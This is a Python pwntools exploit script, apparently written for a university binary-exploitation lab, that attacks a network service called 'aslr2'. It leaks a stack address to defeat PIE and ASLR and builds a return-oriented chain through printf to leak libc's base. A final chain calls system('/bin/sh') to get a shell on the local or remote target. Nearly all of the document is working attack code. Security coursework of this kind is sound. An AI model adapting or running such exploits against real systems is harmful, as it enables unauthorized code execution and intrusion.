#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template aslr2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'aslr2')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('lettieri.iet.unipi.it', 4442)
    else:
        return remote('localhost', 4442)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'

# detect where is rsp in do stuff -> 56
# io = start()
# io.send(flat({
#     0 : "100",
#     500: "A",
# }))
# io.interactive()

io = start()

# call do_stuff, should write soem "do_stuff pointer" in stack
io.send(flat({
    # so that the program calls 0
    0:['10'],
    11 : "A"
}))

ui.pause()

# call echo
io.send(flat({
    # so that the program calls echo
    0:['0'],
}))

ui.pause()

# pass only 1 byte so that it prints the stack
io.send(flat({
    0:['A'],
}))

# in gdb: x/20gx buf
# find something which is in the binary (same address space 0x05e...)
# it is at position [64-8:64]
speak_leak = io.recv()[64-8:64]
speak_leak = u64(speak_leak)

# search 0x00005e30833fc2e9 in the binary with disas (it's inside the do_stuff)
exe.address = speak_leak - (exe.sym['do_stuff']+52)

print("exe.address", hex(exe.address))

ui.pause()

# get the libc address, some gadgets
pop_rdi = 0x0000167b + exe.address
print(hex(pop_rdi))

nop = 0x0000168c + exe.address

payload = flat({
    0:['700A'],
    56 : [
        pop_rdi,
        exe.got['dup'],
        nop,
        exe.plt['printf'],
        
        # not necessary but make the program not fail
        exe.sym['child'],
    ],
})


# call do_stuff, and inject printf
io.send(payload)

dup_leak = io.recv(8)
dup_leak = dup_leak.ljust(8, b'\x00')
dup_leak = u64(dup_leak)

libc.address = dup_leak - libc.sym['dup']

# call do_stuff
io.send(flat({
    0:['700A'],
    56 : [
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        libc.sym['system'],
    ]
}))

io.interactive()

